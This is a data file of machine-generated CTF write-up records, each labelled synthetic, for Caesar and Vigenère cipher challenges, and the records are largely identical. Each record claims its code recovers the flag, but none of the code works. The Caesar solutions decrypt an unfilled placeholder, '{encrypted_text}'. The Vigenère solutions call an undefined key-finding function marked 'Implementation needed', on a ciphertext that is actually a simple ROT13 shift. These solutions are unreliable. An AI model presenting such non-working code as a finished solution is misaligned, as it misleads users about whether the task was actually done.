{"id": "synthetic_classical_021", "team": "synthetic_team_10", "event": "CTF_2024_Event_10", "challenge_name": "Caesar Cipher #22", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/21", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831880", "synthetic": true}
{"id": "synthetic_classical_022", "team": "synthetic_team_8", "event": "CTF_2024_Event_14", "challenge_name": "Vigenère Cipher #23", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/22", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831897", "synthetic": true}
{"id": "synthetic_classical_023", "team": "synthetic_team_1", "event": "CTF_2024_Event_6", "challenge_name": "Vigenère Cipher #24", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/23", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831912", "synthetic": true}
{"id": "synthetic_classical_024", "team": "synthetic_team_10", "event": "CTF_2024_Event_5", "challenge_name": "Caesar Cipher #25", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/24", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831923", "synthetic": true}
{"id": "synthetic_classical_025", "team": "synthetic_team_1", "event": "CTF_2024_Event_4", "challenge_name": "Caesar Cipher #26", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/25", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831933", "synthetic": true}
{"id": "synthetic_classical_026", "team": "synthetic_team_10", "event": "CTF_2024_Event_4", "challenge_name": "Caesar Cipher #27", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/26", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831943", "synthetic": true}
{"id": "synthetic_classical_027", "team": "synthetic_team_6", "event": "CTF_2024_Event_13", "challenge_name": "Vigenère Cipher #28", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/27", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831959", "synthetic": true}
{"id": "synthetic_classical_028", "team": "synthetic_team_5", "event": "CTF_2024_Event_17", "challenge_name": "Vigenère Cipher #29", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/28", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831980", "synthetic": true}
{"id": "synthetic_classical_029", "team": "synthetic_team_1", "event": "CTF_2024_Event_2", "challenge_name": "Caesar Cipher #30", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/29", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831991", "synthetic": true}
{"id": "synthetic_classical_030", "team": "synthetic_team_5", "event": "CTF_2024_Event_20", "challenge_name": "Vigenère Cipher #31", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/30", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832007", "synthetic": true}
{"id": "synthetic_classical_031", "team": "synthetic_team_1", "event": "CTF_2024_Event_15", "challenge_name": "Vigenère Cipher #32", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/31", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832023", "synthetic": true}
{"id": "synthetic_classical_032", "team": "synthetic_team_1", "event": "CTF_2024_Event_13", "challenge_name": "Caesar Cipher #33", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/32", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832039", "synthetic": true}
{"id": "synthetic_classical_033", "team": "synthetic_team_6", "event": "CTF_2024_Event_19", "challenge_name": "Vigenère Cipher #34", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/33", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832055", "synthetic": true}
{"id": "synthetic_classical_034", "team": "synthetic_team_6", "event": "CTF_2024_Event_7", "challenge_name": "Caesar Cipher #35", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/34", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832066", "synthetic": true}
{"id": "synthetic_classical_035", "team": "synthetic_team_10", "event": "CTF_2024_Event_16", "challenge_name": "Vigenère Cipher #36", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/35", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832080", "synthetic": true}
{"id": "synthetic_classical_036", "team": "synthetic_team_3", "event": "CTF_2024_Event_2", "challenge_name": "Vigenère Cipher #37", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/36", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832095", "synthetic": true}
